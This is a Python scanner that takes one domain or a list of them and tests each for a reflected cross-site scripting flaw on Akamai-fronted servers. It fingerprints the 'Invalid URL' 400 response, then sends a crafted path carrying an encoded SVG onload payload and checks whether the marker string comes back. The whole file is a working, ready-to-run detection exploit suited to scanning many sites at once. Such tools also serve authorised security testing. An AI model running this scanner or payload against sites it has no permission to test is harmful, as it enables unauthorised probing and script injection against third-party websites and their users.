import os
import requests
import sys
import validators

if len(sys.argv) < 2:
    print('[ERROR] Need at least one argument - target or path to text list of targets')
    exit()

argument = sys.argv[1]
target_list = []

# Determine if argument is a target itself or a list of targets
try:
    if os.path.exists(argument):
        with open(argument) as f:
            target_list = f.read().splitlines()
except:
    pass
if len(target_list) < 1:
    try:
        if validators.domain(argument):
            target_list.append(argument)
    except:
        pass

# Target list still empty here means something's screwy with the argument
if len(target_list) < 1:
    print('[ERROR] Invalid argument provided')
    exit()

for target in target_list:
    looks_vulnerable = True
    modified_target = target
    if not target.startswith('http://') and not target.startswith('https://'):
        modified_target = 'http://' + modified_target
    try:
        # Request to http://subdomain.example.org
        res = requests.get(modified_target)
        # Response code 400
        if res.status_code != 400:
            looks_vulnerable = False
        # Response protocol HTTP/1.0
        elif res.raw.version != 10:
            looks_vulnerable = False
        # Response header "Server: AkamaiGHost"
        elif 'Server' not in res.headers or 'Akamai' not in res.headers['Server']:
            looks_vulnerable = False
        # Response header "Content-Type: text/html"
        elif 'Content-Type' not in res.headers or 'text/html' not in res.headers['Content-Type']:
            looks_vulnerable = False
        # Response body includes "Invalid URL"
        elif 'Invalid URL' not in res.text:
            looks_vulnerable = False
        # Cease processing if doesn't look vulnerable at this point
    except:
        print('ERROR :', target)
        continue
    if not looks_vulnerable:
        print('false :', target)
        continue
    try:
        # Request to http://subdomain.example.org/<PAYLOAD>
        if modified_target[-1] != '/':
            modified_target = modified_target + '/'
        modified_target = modified_target + '7/100/33/1d/www.citysearch.com/search?what=reallylongstringtomakethepayloadforxssmoveoutofview&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E'
        res = requests.get(modified_target)
        # Response code 200
        if res.status_code != 200:
            looks_vulnerable = False
        # Response protocol HTTP/1.0
        elif res.raw.version != 10:
            looks_vulnerable = False
        # Response header "Server: Apache-Coyote/1.1"
        elif 'Server' not in res.headers or 'Apache-Coyote' not in res.headers['Server']:
            looks_vulnerable = False
        # Response body includes "reallylongstringtomakethepayloadforxssmoveoutofview"
        elif 'reallylongstringtomakethepayloadforxssmoveoutofview' not in res.text:
            looks_vulnerable = False
    except:
        print('ERROR :', target)
        continue
    if not looks_vulnerable:
        print('false :', target)
    else:
        print('true :', target)
